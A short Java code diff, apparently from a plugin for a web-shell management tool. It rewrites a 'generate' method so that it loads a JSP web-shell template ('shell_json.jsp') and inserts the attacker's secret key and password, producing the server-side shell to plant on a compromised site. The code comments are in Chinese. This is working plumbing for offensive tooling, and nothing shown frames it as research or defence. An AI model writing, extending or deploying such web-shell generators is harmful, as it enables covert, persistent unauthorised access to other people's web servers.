@@ -105,10 +105,29 @@ public class JavaAesJson implements Cryption {
         return false; 
     }
 
-    @Override
+  @Override
     public byte[] generate(String password, String secretKey) {
-        // 调用生成器，注意这里我们需要修改生成逻辑或手动生成服务端
-        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
+        try {
+            // [修正] 读取专门的 JSON 模板文件
+            java.io.InputStream inputStream = this.getClass().getResourceAsStream("template/shell_json.jsp");
+            if (inputStream == null) {
+                Log.error("Template 'shell_json.jsp' not found!");
+                return null;
+            }
+            
+            byte[] templateBytes = functions.readInputStream(inputStream);
+            String template = new String(templateBytes);
+
+            // 替换模板中的占位符
+            template = template.replace("{secretKey}", secretKey);
+            // 某些模板可能还需要替换 pass，虽然 json 模式主要靠 secretKey
+            template = template.replace("{pass}", password); 
+
+            return template.getBytes();
+        } catch (Exception e) {
+            Log.error(e);
+            return null;
+        }
     }
 
     @Override
